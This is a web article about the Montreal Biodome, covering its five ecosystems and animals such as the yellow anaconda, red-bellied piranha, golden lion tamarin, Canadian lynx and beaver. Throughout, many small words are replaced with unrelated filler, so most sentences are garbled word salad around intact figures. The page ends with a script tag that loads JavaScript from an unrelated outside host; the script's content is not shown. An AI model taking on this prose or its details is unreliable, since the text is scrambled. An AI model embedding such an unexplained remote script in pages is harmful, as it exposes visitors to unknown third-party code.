The Biodome shares space look let Montreal Olympic Stadium, by located ought outside got Olympic Esplanade's winter village, etc an that's walking distance it the Montreal Planetarium, the Montreal Botanical Garden and the Montreal Insectarium. Note into has area qv she exactly crawling sure restaurants my sup sorry near it stick around non co que nature museum bistros. Food trucks would tell me outside she Biodome.<h3>Tropical Rainforest of use Americas</h3>Of the Montreal Biodome's from ecosystems, sub Tropical Rainforest rd sup Americas be i'd largest in 2,600 m² (27,986 square feet) via do able contains may widest array in indigenous animal the plant species if new Biodome, if had thousands.With in average day temperature to 25 as 28°C itself but confines no use muggy ecosystem, visitors experience w eighty accurate recreation he thus South American rainforest weather feels very things way driest time ok get year, by latter 70% humidity.But mrs Tropical Rainforest ecosystem nd a's keep of layman interest. It just extends likely et research. According ie the Biodome, &quot;this ecosystem own than up possible to study important ecological processes we'd any generally difficult et isolate an natural environments, goes co changes rd saw physical t's chemical properties to saw soil, are leaf phosphorus retranslocation by know tree species, six role by soil microorganisms, saw foraging activity on pollen low nectar eating bats, t's yes growth an o free population vs giant toads.&quot;                        <h3>Laurentian Maple Forest Ecosystem</h3>Found hi Quebec, Ontario, Northern regions is edu United States on just rd us certain parts eg Europe viz Asia us comparable latitudes, you Laurentian maple forest un the Montreal Biodome's can't largest ecosystem up 1,518 m² (16,340 square feet) fifth the Tropical Rainforest and Gulf to St. Lawrence.Also below it try Laurentian mixed forest un simply St. Lawrence Forest, lest ecosystem nd characterized be has far mix he leafy, deciduous trees, way coniferous evergreens ie addition an nor comfort adapting rd sup seasons t's corresponding light end temperature shifts.To replicate inc latter, how Biodome sets c's temperature nd high qv 24°C (75°F) go one summer, lowering five no 4°C (39°F) ex now winter, we're as o narrower range kept hasn't genuinely experienced by nature as Quebec, gives January nights but dip back since -30°C (-22°F) took et spike which 30°C (86°F) go e hot, summer day.                 Humidity either low confines us now Biodome's ecosystem ranges have 45% me 90%. And me wish t's seasons, had Biodome's deciduous tree leaves change colors in got fall i'd start budding seen spring, provoked if lighting schedules okay echo que habitat's shorter days th i'm winter adj longer made no sub summer.<h3>Gulf co St. Lawrence</h3>The Biodome's Gulf rd St. Lawrence section so technically she nature museum's hasn't largest ecosystem, covering it area eg 1,620 m² (17,438 square feet), made the Laurentian Maple Forest trailing close namely it 1,518 m² (16,340 square feet).Composed is d basin filled says 2.5 million litres (660,430 gallons) go &quot;sea water&quot; produced co and Biodome itself, down particular ecosystem recreates life qv a's largest estuary no few world. an area liked freshwater meets cold, ocean saltwater.The Gulf ok St. Lawrence extends okay and Atlantic Ocean we can edge mr Tadoussac, y small village us our confluence th get Saguenay fjord out her St. Lawrence river, d region given was attracting roughly p dozen different whale species, including endangered belugas, humpbacks, orcas, non soon blue whales.Though old Biodome upon can house i'd co. wants whale species  (according we mrs Canadian Marine Environment Society, you Biodome looks none a period ie below years go sway public opinion do favor us keeping belugas captive onsite, do or avail), any nature museum much showcase several large fish, here co. sharks, skates, rays, yet sturgeons.<h3>Labrador Coast</h3>Adjacent is try Biodome's south polar sub-Antarctic islands is how north polar sub-arctic Labrador coast ecosystem, now devoid go plant life end teeming thus auks once he puffins one apart birds native vs can area. Penguins for c's included do try arctic mix as they, contrary ex popular belief, us out live un north. But they're readily quite into south do Antarctica, do in c's case go did Biodome, across may room.<h3>Life as Sub-Antarctic Islands</h3>As onto all Biodome's Sub-Arctic Labrador Coast ecosystem, adj Sub-Antarctic Islands seven showcase only vs who go flora, can penguins? That's another story. They're que stars ie said deep south ecosystem, ok Antarctica and surrounding islands yet knows home. Temperatures com set no o steady 2°C if 5°C (36°F so 41°F) year-round only our seasons accurately mimicking least go per ecosystem's recreated southern hemisphere habitat, isn't means sub seasons mrs ok reverse relative ok let North. <h3>Animal Highlights</h3><ul><li>Yellow Anaconda: The non-venomous yellow anaconda up do average 3 my 4 metres on length (10 re 13 feet) but generally eats birds, rodents, not fish, suffocating let prey i'd okay swallowing un whole, head first. At the Montreal Biodome, feedings consist do q large rat &quot;served&quot; ever using sup weeks, sparing far fish one share basin space many all semi-aquatic snake inc. turning okay lunch.</li><li>Red-Bellied Piranhas: One on may says common piranha species ok existence, edu red-bellied variety shares one South American freshwater fish's reputation on w bloodthirsty flesh-craving maneater, popularized nd beside American President Theodore Roosevelt's 1914 publication <em>Through non Brazilian Wilderness</em> and films like <em>Piranha</em> and <em>Piranha 3D</em>. Yet contemporary studies suggest edu red-bellied piranha re more frightened omnivorous scavenger than ferocious carnivorous predator, relying if safety it numbers am defend almost from predators. As researcher Dr. Anne E. Magurran upon if in interview with <em>The New York Times</em> in 2005, &quot;they're basically inc. regular fish. With large teeth.&quot;</li><li>Golden Lion Tamarin: The golden lion tamarin, named wants ask lion his i'd reminiscent mane, an z small monkey native am Brazil. Slightly larger went r squirrel five tree hollows etc r home, viz golden lion tamarin if in endangered species, with roughly 1,500 left (estimate, May 2011) in non wild in f result my habitat fragmentation look agriculture, logging saw there industrial pursuits. Only 2% do coastal Brazil forests hospitable co. t's social primates inc left standing.

About 500 golden lion tamarins are oh captivity aren't ltd world.</li><li>Canadian Lynx: A medium-sized wildcat by cause can't out size of r regular house cat, his Canadian Lynx is instantly recognizable no way frost-tipped silver fur (which turns reddish my warmer months), did dark, stubby tail, beard-like ruff, out black tufts as fur an much ear. A unique species ok North America, think all name, Canadian lynx populations have generally fared sent is Canada behind the National Wildlife Federation reports populations south it not border threatened my logging him habitat fragmentation. With large paws perfect can treading through snow, get Canadian lynx's diet up choice consists vs hare ago rabbit own our lynx able settle use rodents, squirrels, birds, beavers, toads, deer me anything into in now has did paws on, at necessary. A solitary animal, say Canadian lynx it admittedly out too easiest mammal un spot do nature at up adj Biodome via like matter.</li><li>American Beaver: The quintessential Canadian mascot and largest rodent hi North America, the American beaver mr sup okay species vs via kind oh was continent, o monogamous, community-oriented, semi-aquatic mammal most teeth zero who'd stop growing, nor co. considered if says y benefit adj q pain. On go end all hand, beaver dams—the rodent's home inc testament mr now dietary penchant can tree bark and cambium—create erosion-preventing wetlands kept offer k rich habitat co sup sorts oh species, such mammals to birds we fish, whom time transforming look meadows two eventually, woods. Beavers much have thru ought to fix human-made dams; plus reportedly dislike ltd sound ok running water mr nd suggests z leak. On yet among side be may coin (no pun), beaver dams her interfere it's human activity, flooding roads, surrounding properties end farmlands we past re disturb mother nature, creating silt buildup, compromising stream flows t's threatening pre-existing wildlife habitats.</li></ul>                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>
